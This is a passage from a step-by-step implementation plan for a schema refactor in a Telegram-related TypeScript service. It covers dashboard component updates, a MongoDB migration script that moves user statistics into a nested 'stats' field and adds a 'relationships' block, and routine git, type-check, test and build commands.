Replace `user.ownPhotoCount` → `user.stats.ownPhotoCount`, `user.otherPhotoCount` → `user.stats.otherPhotoCount`, `user.ownVideoCount` → `user.stats.ownVideoCount`, `user.otherVideoCount` → `user.stats.otherVideoCount`, `user.msgs` → `user.stats.msgs`, `user.lastActive` → `user.stats.lastActive`, `user.movieCount` → `user.stats.movieCount`, `user.contacts` → `user.stats.contacts`.

The `user.calls` path stays the same (still `user.calls.incoming` etc.) since `calls` is still a top-level field.

- [ ] **Step 4: Update ChatExplorer.tsx**

`chat.calls` references are from `TopPrivateChat` type (Telegram manager), not User schema — these may not need changes. Verify the `calls` field paths match. If they reference `chat.calls.totalCalls`, `chat.calls.incoming` etc., these are fine since `TopPrivateChat.calls` is `PerChatCallStats` which hasn't changed.

- [ ] **Step 5: Commit**

```bash
git add my-tg-local/src/types/api.ts my-tg-local/src/components/UserProfileView.tsx my-tg-local/src/components/UserSelector.tsx my-tg-local/src/components/ChatExplorer.tsx
git commit -m "fix(dashboard): update user type and components for restructured schema"
```

---

### Task 10: MongoDB Migration Script

**Files:**
- Create: `scripts/migrate-user-schema.ts`

- [ ] **Step 1: Create migration script**

Create `CommonTgService-local/scripts/migrate-user-schema.ts`:

```typescript
/**
 * One-time migration: flatten User fields → nested structure
 * 
 * Run: npx ts-node scripts/migrate-user-schema.ts
 * 
 * Safe to run multiple times — uses $rename which is a no-op if source field doesn't exist.
 */
import { MongoClient } from 'mongodb';

const MONGO_URI = process.env.MONGO_URI || process.env.DB_URI;

async function migrate() {
  if (!MONGO_URI) {
    console.error('Set MONGO_URI or DB_URI environment variable');
    process.exit(1);
  }

  const client = new MongoClient(MONGO_URI);
  await client.connect();
  const db = client.db();
  const users = db.collection('users');

  console.log('Starting user schema migration...');

  // Step 1: Rename flat fields to stats.*
  const renameResult = await users.updateMany(
    { 'stats': { $exists: false } },  // only migrate docs without stats
    {
      $rename: {
        channels: 'stats.channels',
        personalChats: 'stats.personalChats',
        totalChats: 'stats.totalChats',
        contacts: 'stats.contacts',
        msgs: 'stats.msgs',
        photoCount: 'stats.photoCount',
        videoCount: 'stats.videoCount',
        movieCount: 'stats.movieCount',
        ownPhotoCount: 'stats.ownPhotoCount',
        otherPhotoCount: 'stats.otherPhotoCount',
        ownVideoCount: 'stats.ownVideoCount',
        otherVideoCount: 'stats.otherVideoCount',
        lastActive: 'stats.lastActive',
      },
    },
  );
  console.log(`Renamed flat fields → stats.*: ${renameResult.modifiedCount} docs`);

  // Step 2: Remove calls.chats (moved to relationships.top)
  const unsetResult = await users.updateMany(
    { 'calls.chats': { $exists: true } },
    { $unset: { 'calls.chats': '' } },
  );
  console.log(`Removed calls.chats: ${unsetResult.modifiedCount} docs`);

  // Step 3: Remove old score field, init relationships block
  const relResult = await users.updateMany(
    { relationships: { $exists: false } },
    {
      $set: {
        relationships: { score: 0, bestScore: 0, computedAt: null, top: [] },
      },
      $unset: { score: '' },
    },
  );
  console.log(`Initialized relationships block: ${relResult.modifiedCount} docs`);

  // Step 4: Create index on relationships.bestScore
  await users.createIndex({ 'relationships.bestScore': -1 });
  console.log('Created index: relationships.bestScore');

  await users.createIndex({ 'stats.lastActive': -1 });
  console.log('Created index: stats.lastActive');

  console.log('Migration complete.');
  await client.close();
}

migrate().catch(err => {
  console.error('Migration failed:', err);
  process.exit(1);
});
```

- [ ] **Step 2: Commit**

```bash
git add scripts/migrate-user-schema.ts
git commit -m "feat(scripts): add one-time user schema migration script"
```

---

### Task 11: Final Verification

- [ ] **Step 1: Type-check entire project**

Run: `npx tsc --noEmit --pretty 2>&1 | head -40`
Expected: Clean — no errors

- [ ] **Step 2: Run tests**

Run: `cd CommonTgService-local && npx jest --no-coverage 2>&1 | tail -30`

- [ ] **Step 3: Verify build**

Run: `cd CommonTgService-local && npm run build 2>&1 | tail -10`

- [ ] **Step 4: Final commit**

```bash
git add -A
git commit -m "feat(users): relationship scoring with schema refactor - complete"
```
